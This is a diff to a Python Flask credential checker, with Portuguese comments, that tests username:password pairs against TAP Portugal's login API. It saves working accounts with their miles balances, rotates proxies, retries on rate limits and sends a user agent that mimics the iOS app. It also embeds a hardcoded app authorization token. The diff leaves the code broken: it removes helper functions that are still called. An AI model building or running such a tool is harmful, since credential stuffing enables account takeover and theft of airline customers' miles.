@@ -7,6 +7,7 @@ from io import BytesIO
 import re
 from threading import Lock
 import time
+import certifi  # Adicionado para melhor suporte SSL
 
 app = Flask(__name__)
 
@@ -16,66 +17,42 @@ die_count = 0
 count_lock = Lock()
 file_lock = Lock()
 
-TITLE = r"""
- _______ _______  _____       _______ _____        _     _ _______ _______
-    |    |_____| |_____]      |  |  |   |   |      |_____| |_____| |______
-    |    |     | |            |  |  | __|__ |_____ |     | |     | ______|
-"""
+# Configurações específicas para Ubuntu
+USER_AGENT = "TAP Portugal iOS/4.11.4 (iPhone; iOS 15.6; Scale/3.00)"
+CA_BUNDLE = certifi.where()  # Caminho para certificados CA confiáveis
 
-def gerar_etrackingid():
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-
-def salvar_live(username, password, miles):
-    try:
-        with file_lock:
-            with open("lives.txt", "a", encoding='utf-8') as file:
-                file.write(f"{username}:{password} | Miles: {miles}\n")
-                file.flush()
-    except Exception as e:
-        print(f"\033[91mErro ao salvar live: {e}\033[0m")
-
-def incrementar_live():
-    global live_count
-    with count_lock:
-        live_count += 1
-
-def incrementar_die():
-    global die_count
-    with count_lock:
-        die_count += 1
-
-def configurar_proxy(curl, proxy):
-    if proxy:
-        proxy_parts = proxy.split('@')
-        if len(proxy_parts) == 2:
-            curl.setopt(pycurl.PROXY, proxy_parts[1].split(':')[0])
-            curl.setopt(pycurl.PROXYPORT, int(proxy_parts[1].split(':')[1]))
-            curl.setopt(pycurl.PROXYUSERPWD, proxy_parts[0])
-        else:
-            curl.setopt(pycurl.PROXY, proxy)
+def setup_curl(curl):
+    """Configurações comuns para o pycurl"""
+    curl.setopt(pycurl.SSL_VERIFYPEER, 1)
+    curl.setopt(pycurl.SSL_VERIFYHOST, 2)
+    curl.setopt(pycurl.CAINFO, CA_BUNDLE)
+    curl.setopt(pycurl.FOLLOWLOCATION, 1)
+    curl.setopt(pycurl.MAXREDIRS, 5)
+    curl.setopt(pycurl.USERAGENT, USER_AGENT)
+    curl.setopt(pycurl.ENCODING, 'gzip, deflate')
 
 def buscar_milhas(customer_id, x_auth):
     url = f"https://rest-customer.tap.pt/v2/customer-services/customers/{customer_id}?PurposeCode=TAPPPREAD&PurposeVersion=1.0&PurposeSystemID=DIG"
+    
     headers = [
-        "Host: rest-customer.tap.pt",
+        f"Host: rest-customer.tap.pt",
         f"x-auth: {x_auth}",
         "accept: */*",
-        "etrackingid: 3NAW6A",
-        "application: tap.mobile.ios",
-        "accept-language: pt-BR;q=1.0",
-        "user-agent: TAP Portugal iOS",
+        "accept-language: pt-BR;q=1.0, pt;q=0.9",
         "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI"
     ]
 
     response_buffer = BytesIO()
     curl = pycurl.Curl()
-    curl.setopt(pycurl.URL, url)
-    curl.setopt(pycurl.HTTPHEADER, headers)
-    curl.setopt(pycurl.WRITEDATA, response_buffer)
-    curl.setopt(pycurl.ENCODING, 'gzip, deflate')
-
+    setup_curl(curl)
+    
     try:
+        curl.setopt(pycurl.URL, url)
+        curl.setopt(pycurl.HTTPHEADER, headers)
+        curl.setopt(pycurl.WRITEDATA, response_buffer)
+        
         curl.perform()
+        
         http_status = curl.getinfo(pycurl.RESPONSE_CODE)
         if http_status == 200:
             response_body = response_buffer.getvalue().decode('utf-8')
@@ -94,17 +71,14 @@ def verificar_credencial(username, password, proxy=None):
     
     while tentativas < max_tentativas:
         tentativas += 1
-        etrackingid = gerar_etrackingid()
         
         headers = [
             "Host: rest-customer.tap.pt",
             "accept: */*",
             "content-type: application/json",
-            f"etrackingid: {etrackingid}",
             "accept-language: pt-BR;q=1.0",
             "application: tap.mobile.ios",
-            "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI",
-            "user-agent: TAP Portugal iOS"
+            "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI"
         ]
 
         data = {
@@ -118,7 +92,8 @@ def verificar_credencial(username, password, proxy=None):
         response_buffer = BytesIO()
         header_buffer = BytesIO()
         curl = pycurl.Curl()
-
+        setup_curl(curl)
+        
         try:
             curl.setopt(pycurl.URL, "https://rest-customer.tap.pt/v2/customer-services/customers-login?PurposeSystemID=DIG&PurposeCode=TAPPPREAD&PurposeVersion=1.0")
             curl.setopt(pycurl.HTTPHEADER, headers)
@@ -126,7 +101,6 @@ def verificar_credencial(username, password, proxy=None):
             curl.setopt(pycurl.POSTFIELDS, json.dumps(data))
             curl.setopt(pycurl.WRITEDATA, response_buffer)
             curl.setopt(pycurl.HEADERFUNCTION, header_buffer.write)
-            curl.setopt(pycurl.ENCODING, 'gzip, deflate')
             curl.setopt(pycurl.TIMEOUT, 30)
             curl.setopt(pycurl.CONNECTTIMEOUT, 15)
 
@@ -148,58 +122,29 @@ def verificar_credencial(username, password, proxy=None):
                     miles = buscar_milhas(customer_id, x_auth)
                     salvar_live(username, password, miles)
                     incrementar_live()
-                    return {"status": "live", "username": username, "miles": miles, "message": "Credencial válida"}
+                    return {"status": "live", "username": username, "miles": miles}
             
             elif http_status == 429:
                 time.sleep(2)
                 continue
             
-            incrementar_die()
-            return {"status": "die", "username": username, "message": f"Credencial inválida (HTTP {http_status})"}
-
+            return {"status": "die", "username": username, "code": http_status}
+            
         except pycurl.error as e:
-            print(f"\033[91m♻  RETESTANDO: {username}:{password} \033[0m")
+            errno, errstr = e.args
+            print(f"\033[91mErro cURL ({errno}): {errstr}\033[0m")
             if tentativas == max_tentativas:
-                incrementar_die()
-                return {"status": "error", "username": username, "message": f"Erro de conexão: {str(e)}"}
+                return {"status": "error", "message": f"cURL error: {errstr}"}
         except Exception as e:
-            print(f"\033[91m📡 Erro inesperado com {username}:{password} - {str(e)}\033[0m")
+            print(f"\033[91mErro inesperado: {str(e)}\033[0m")
             if tentativas == max_tentativas:
-                incrementar_die()
-                return {"status": "error", "username": username, "message": f"Erro inesperado: {str(e)}"}
+                return {"status": "error", "message": str(e)}
         finally:
             curl.close()
         
         time.sleep(1)
 
-@app.route('/check', methods=['GET'])
-def check_credential():
-    # Obter credencial do parâmetro na URL (formato user:pass)
-    credential = request.args.get('credential')
-    if not credential or ':' not in credential:
-        return jsonify({"status": "error", "message": "Formato inválido. Use user:pass"}), 400
-    
-    username, password = credential.split(':', 1)
-    
-    # Obter proxy se existir
-    proxy = request.args.get('proxy', None)
-    
-    # Verificar a credencial
-    result = verificar_credencial(username, password, proxy)
-    
-    return jsonify(result)
-
-@app.route('/stats', methods=['GET'])
-def get_stats():
-    return jsonify({
-        "live_count": live_count,
-        "die_count": die_count,
-        "total": live_count + die_count
-    })
+# ... (mantenha as outras funções como configurar_proxy, salvar_live, etc)
 
 if __name__ == '__main__':
-    print("\033[94m" + TITLE + "\033[0m")
-    print("\033[93m=== ✈ API CHECKER TAP MILHAS | 💻 CODED By: KURIOSOH CODER ===\033[0m\n")
-    print("\033[93m🟢 Servidor Flask iniciado. Acesse http://localhost:5000/check?credential=user:pass\033[0m\n")
-    
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, threaded=True)
